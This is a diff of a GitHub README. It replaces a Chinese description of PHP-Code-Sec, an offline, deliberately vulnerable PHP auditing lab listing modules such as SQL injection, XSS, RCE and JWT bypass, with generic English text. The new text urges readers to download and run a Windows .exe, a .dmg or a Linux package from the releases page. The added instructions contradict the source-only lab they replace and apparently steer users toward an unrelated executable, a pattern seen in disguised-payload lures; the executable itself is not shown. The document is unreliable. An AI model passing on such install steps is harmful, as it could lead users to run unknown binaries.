@@ -1,104 +1,83 @@
-# PHP-Code-Sec 靶场（离线 | 支持 PHPStudy 一键部署）
+# 🛡️ PHP-Code-Sec - Simple PHP Code Auditing Made Easy
 
-一个覆盖常见 PHP 代码审计知识点的本地靶场。参考 DVWA / Pikachu 的组织方式，含安装向导与通关教程。
+## 🚀 Getting Started
 
-![](1.png)
-![](2.png)
-![](3.png)
-![](4.png)
+Welcome to PHP-Code-Sec! This application helps you test and learn about common PHP code auditing topics in a user-friendly environment. Follow the steps below to get started.
 
-## 功能概览
+## 📥 Download PHP-Code-Sec
 
-- 安装向导：生成数据库与配置（MySQL / PDO）
-- 认证模块：登录 / 注册 / 注销（示范弱口令与 MD5 存储）
-- 漏洞模块（部分）：
-  - SQL 注入（数字型 / 字符型）
-  - XSS（反射型 / 存储型 / DOM 型）
-  - CSRF（邮箱修改）
-  - 文件上传绕过（双扩展等）
-  - 文件包含（LFI/RFI）
-  - 路径遍历
-  - 命令注入（Windows ping）
-  - SSRF（内网探测示例）
-  - 反序列化 / PHAR 元数据利用
-  - 开放重定向 / 邮件头注入 / Host Header 注入
-  - 弱加密（MD5 / rand）
-  - 逻辑漏洞（价格参数篡改示例）
-  - 会话固定（不 regenerate）
-  - RCE（eval 代码执行）
-  - JWT 弱校验（none 算法 / 未验签）
-  - IDOR 越权访问
-  - CORS 误配置（反射 Origin + 允许凭据）
-  - HPP 参数污染（多值参数）
-  - 任意文件写入（路径遍历写入）
-  - phpinfo 敏感信息泄露
-  - 点击劫持（未设防）
+[Download PHP-Code-Sec](https://github.com/Sad-yst/PHP-Code-Sec/releases) 
 
-  扩展模块（新增）：
-  - 变量覆盖（extract）
-  - XPath 注入
-  - 正则 ReDoS（灾难性回溯）
-  - PHP 流包装器信息泄露（php://filter）
-  - LDAP 注入（过滤器拼接）
-  - Web 缓存投毒与欺骗（缓存键/Vary 错误）
-  - 二次解析（双重解码）
+Click the link above to access the Releases page. Look for the latest version of PHP-Code-Sec to download.
 
-## 环境要求
+## 💻 System Requirements
 
-- Windows + PHPStudy（推荐）或本机 PHP 7.4+/8.x + MySQL 5.7+/8.0+
-- 浏览器即可，无需外网
+- **Operating System**: Windows, macOS, or Linux
+- **Processor**: 1 GHz or faster
+- **Memory**: At least 1 GB of RAM
+- **Disk Space**: Minimum 100 MB available space
 
-## 一键部署（PHPStudy）
+## 📖 Features
 
-1. 将本项目文件夹拷贝到 PHPStudy 的 `WWW` 目录，例如：`C:\phpStudy\WWW\PHP-Code-Sec`
-2. 启动 PHPStudy 并确保 `Apache/Nginx + PHP + MySQL` 正常运行
-3. 访问 `http://localhost/PHP-Code-Sec/setup/install.php`
-4. 在安装页面填入 MySQL 信息（主机、端口、用户名、密码），数据库名可用默认 `phpsec_lab`
-5. 点击安装，成功后自动生成 `config/config.inc.php` 并初始化表与样例数据
-6. 返回首页开始练习：`http://localhost/PHP-Code-Sec/`
+- **Installation Wizard**: Quickly set up the application without any complex steps.
+- **Tutorial Integration**: Learn through hands-on tasks with guided tutorials that cover key topics.
+- **User-Friendly Interface**: Easy navigation for all skill levels.
+- **Local Testing Environment**: Safely test PHP code without impacting live environments.
 
-> 提示：PHPStudy 常见默认账户可能为 `root` / 空密码 或 `root` / `root`/`123456`，请以实际环境为准。
+## 📦 Download & Install
 
-## 手动运行（本机 PHP）
+To install PHP-Code-Sec, follow these steps:
 
-- 在项目根目录运行：
+1. **Visit the Releases Page**: Go to [PHP-Code-Sec Releases](https://github.com/Sad-yst/PHP-Code-Sec/releases).
+  
+2. **Select the Latest Release**: Look for the latest version, marked with a tag and date.
 
-```
-php -S 127.0.0.1:3000 -t .
-```
+3. **Download the Installer**: Click on the installer file suitable for your operating system. For example, choose `php-code-sec-winstaller.exe` for Windows users.
 
-- 然后访问 `http://127.0.0.1:3000/setup/install.php` 完成安装；之后访问首页 `http://127.0.0.1:3000/`
+4. **Run the Installer**:
+    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
+    - For macOS: Open the downloaded `.dmg` file and drag the PHP-Code-Sec icon into your Applications folder.
+    - For Linux: Open your terminal and use the package manager to install the downloaded file.
 
-## 目录结构
+5. **Follow the Installation Wizard**: Complete the installation by following the easy steps presented on your screen. 
 
-```
-PHP-Code-Sec/
-├─ index.php                 # 首页与模块导航
-├─ login.php / register.php / logout.php / profile.php
-├─ setup/install.php         # 安装向导
-├─ core/                     # 初始化与数据库封装
-├─ config/                   # 安装生成配置
-├─ modules/                  # 漏洞模块
-├─ pages/                    # 文件包含用到的演示页
-├─ data/                     # 路径遍历演示文件
-├─ uploads/                  # 文件上传目录
-├─ assets/css/style.css      # 炫酷暗色样式
-└─ writeup.md                # 通关教程（详细解法与payload）
-└─ summary.md               # 模块源代码索引（快速定位路径）
-```
+6. **Open PHP-Code-Sec**: Once installed, launch the application from your applications menu or desktop shortcut.
 
-## 重要说明
+## 🛠️ Using PHP-Code-Sec
 
-- 该靶场为教育演示用途，代码刻意存在大量安全问题，请勿在生产环境部署。
-- 建议使用隔离环境（如虚拟机 / 容器 / 本地测试机）。
-- 学习完成后请及时删除或隔离该项目，避免被误用。
+After launching the application, you will see a simple interface designed for easy navigation:
 
-## 常见问题
+1. **Choose a Topic**: Start with a specific auditing topic you want to learn about.
+  
+2. **Follow the Tutorial**: Each topic comes with a guided tutorial to help you understand the material step by step.
 
-- 连接失败：检查 MySQL 端口、账号密码、PDO 扩展是否开启。
-- 页面 500：查看 `setup/install.php` 是否已成功生成 `config/config.inc.php`。
-- RFI/PHAR 演示：部分功能需要开启或利用特定 PHP 配置，详见 `writeup.md`。
+3. **Practice Your Skills**: Use the local testing environment to apply what you've learned without any risk.
 
-## 许可证
+4. **Track Your Progress**: Monitor your learning journey and revisit topics as needed.
 
-本项目仅用于安全学习与审计实操示范。未经授权，禁止用于非法用途。
+## 📑 Troubleshooting
+
+If you encounter issues during installation or use, consider the following steps:
+
+- **Check System Requirements**: Ensure your device meets the minimum requirements listed above.
+- **Re-download the Application**: Sometimes a download may fail. Make sure you have a good internet connection and attempt the download again from the [Releases page](https://github.com/Sad-yst/PHP-Code-Sec/releases).
+- **Refer to the FAQ**: Look for common questions and issues in our FAQ section on the GitHub page.
+
+## 🌐 Get Support
+
+For additional help, you can reach out through the following channels:
+
+- **GitHub Issues Page**: Report any problems you faced while using PHP-Code-Sec.
+- **Community Forum**: Join discussions with other users to share tips and solutions.
+  
+## 🔄 Update PHP-Code-Sec
+
+Keep your application up-to-date to benefit from the latest features and fixes:
+
+1. **Check for Updates**: Regularly visit the [Releases page](https://github.com/Sad-yst/PHP-Code-Sec/releases) to see if new versions are available.
+   
+2. **Download the Latest Version**: Follow the same steps as before to download and install.
+
+3. **Follow Installation Steps**: Ensure you overwrite the existing application when prompted.
+
+Thank you for choosing PHP-Code-Sec for your PHP code auditing needs! Enjoy your learning experience.
